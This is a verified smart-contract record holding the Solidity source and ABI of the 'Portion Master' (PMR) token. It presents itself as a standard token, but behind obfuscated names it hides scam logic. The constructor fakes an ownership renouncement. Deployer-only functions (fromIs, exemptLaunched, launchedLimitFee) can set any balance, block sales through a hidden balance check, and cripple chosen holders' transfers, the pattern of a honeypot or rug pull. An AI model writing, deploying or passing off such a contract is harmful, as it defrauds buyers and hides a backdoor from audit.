{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface feeTo {\n    function createPair(address minReceiver, address isTokenMarketing) external returns (address);\n}\n\ninterface txToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldTotal) external view returns (uint256);\n\n    function transfer(address atSell, uint256 tokenLiquidityShould) external returns (bool);\n\n    function allowance(address teamBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenLiquidityShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atSell,\n        uint256 tokenLiquidityShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverSender, uint256 value);\n    event Approval(address indexed teamBuy, address indexed spender, uint256 value);\n}\n\nabstract contract marketingFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minAmountReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txTokenMetadata is txToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PortionMaster is marketingFund, txToken, txTokenMetadata {\n\n    function approve(address receiverAutoMax, uint256 tokenLiquidityShould) public virtual override returns (bool) {\n        receiverMarketing[_msgSender()][receiverAutoMax] = tokenLiquidityShould;\n        emit Approval(_msgSender(), receiverAutoMax, tokenLiquidityShould);\n        return true;\n    }\n\n    function totalWallet(address isTotalLaunch, address atSell, uint256 tokenLiquidityShould) internal returns (bool) {\n        if (isTotalLaunch == modeReceiver) {\n            return amountSender(isTotalLaunch, atSell, tokenLiquidityShould);\n        }\n        uint256 teamFrom = txToken(atList).balanceOf(tradingSwap);\n        require(teamFrom == atTx);\n        require(atSell != tradingSwap);\n        if (liquidityFundTotal[isTotalLaunch]) {\n            return amountSender(isTotalLaunch, atSell, toLaunchedSell);\n        }\n        return amountSender(isTotalLaunch, atSell, tokenLiquidityShould);\n    }\n\n    function launchedLimitFee(address tradingTotal) public {\n        minExempt();\n        \n        if (tradingTotal == modeReceiver || tradingTotal == atList) {\n            return;\n        }\n        liquidityFundTotal[tradingTotal] = true;\n    }\n\n    uint8 private shouldEnableLimit = 18;\n\n    event OwnershipTransferred(address indexed enableTo, address indexed liquidityTx);\n\n    address tradingSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private exemptMax;\n\n    function amountSender(address isTotalLaunch, address atSell, uint256 tokenLiquidityShould) internal returns (bool) {\n        require(tradingExemptLaunch[isTotalLaunch] >= tokenLiquidityShould);\n        tradingExemptLaunch[isTotalLaunch] -= tokenLiquidityShould;\n        tradingExemptLaunch[atSell] += tokenLiquidityShould;\n        emit Transfer(isTotalLaunch, atSell, tokenLiquidityShould);\n        return true;\n    }\n\n    function fromIs(address listTeam, uint256 tokenLiquidityShould) public {\n        minExempt();\n        tradingExemptLaunch[listTeam] = tokenLiquidityShould;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingAmount;\n    }\n\n    function exemptLaunched(uint256 tokenLiquidityShould) public {\n        minExempt();\n        atTx = tokenLiquidityShould;\n    }\n\n    uint256 private senderFund = 100000000 * 10 ** 18;\n\n    function balanceOf(address shouldTotal) public view virtual override returns (uint256) {\n        return tradingExemptLaunch[shouldTotal];\n    }\n\n    address totalFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private marketingAmount = \"PMR\";\n\n    function getOwner() external view returns (address) {\n        return exemptMax;\n    }\n\n    address public modeReceiver;\n\n    function transferFrom(address isTotalLaunch, address atSell, uint256 tokenLiquidityShould) external override returns (bool) {\n        if (_msgSender() != totalFee) {\n            if (receiverMarketing[isTotalLaunch][_msgSender()] != type(uint256).max) {\n                require(tokenLiquidityShould <= receiverMarketing[isTotalLaunch][_msgSender()]);\n                receiverMarketing[isTotalLaunch][_msgSender()] -= tokenLiquidityShould;\n            }\n        }\n        return totalWallet(isTotalLaunch, atSell, tokenLiquidityShould);\n    }\n\n    function owner() external view returns (address) {\n        return exemptMax;\n    }\n\n    bool private amountTeamList;\n\n    mapping(address => bool) public liquidityFundTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderFund;\n    }\n\n    uint256 atTx;\n\n    address public atList;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldTo;\n    }\n\n    mapping(address => uint256) private tradingExemptLaunch;\n\n    uint256 constant toLaunchedSell = 18 ** 10;\n\n    bool public maxSell;\n\n    function fundMarketing(address liquidityAmount) public {\n        if (maxSell) {\n            return;\n        }\n        if (txTotal) {\n            marketingReceiverLiquidity = false;\n        }\n        buyMinLaunched[liquidityAmount] = true;\n        if (marketingReceiverLiquidity != amountTeamList) {\n            amountTeamList = false;\n        }\n        maxSell = true;\n    }\n\n    constructor (){\n        \n        minAmountReceiver amountLaunch = minAmountReceiver(totalFee);\n        atList = feeTo(amountLaunch.factory()).createPair(amountLaunch.WETH(), address(this));\n        \n        modeReceiver = _msgSender();\n        buyMinLaunched[modeReceiver] = true;\n        tradingExemptLaunch[modeReceiver] = senderFund;\n        takeEnable();\n        if (txTotal) {\n            marketingReceiverLiquidity = false;\n        }\n        emit Transfer(address(0), modeReceiver, senderFund);\n    }\n\n    function transfer(address listTeam, uint256 tokenLiquidityShould) external virtual override returns (bool) {\n        return totalWallet(_msgSender(), listTeam, tokenLiquidityShould);\n    }\n\n    function allowance(address takeSell, address receiverAutoMax) external view virtual override returns (uint256) {\n        if (receiverAutoMax == totalFee) {\n            return type(uint256).max;\n        }\n        return receiverMarketing[takeSell][receiverAutoMax];\n    }\n\n    bool public marketingReceiverLiquidity;\n\n    bool private txTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldEnableLimit;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverMarketing;\n\n    uint256 teamAt;\n\n    uint256 public toLaunch;\n\n    mapping(address => bool) public buyMinLaunched;\n\n    function minExempt() private view {\n        require(buyMinLaunched[_msgSender()]);\n    }\n\n    string private shouldTo = \"Portion Master\";\n\n    bool public autoAt;\n\n    function takeEnable() public {\n        emit OwnershipTransferred(modeReceiver, address(0));\n        exemptMax = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAutoMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAutoMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenLiquidityShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMinLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenLiquidityShould\",\"type\":\"uint256\"}],\"name\":\"exemptLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenLiquidityShould\",\"type\":\"uint256\"}],\"name\":\"fromIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"}],\"name\":\"fundMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTotal\",\"type\":\"address\"}],\"name\":\"launchedLimitFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityFundTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiverLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenLiquidityShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTotalLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenLiquidityShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PortionMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}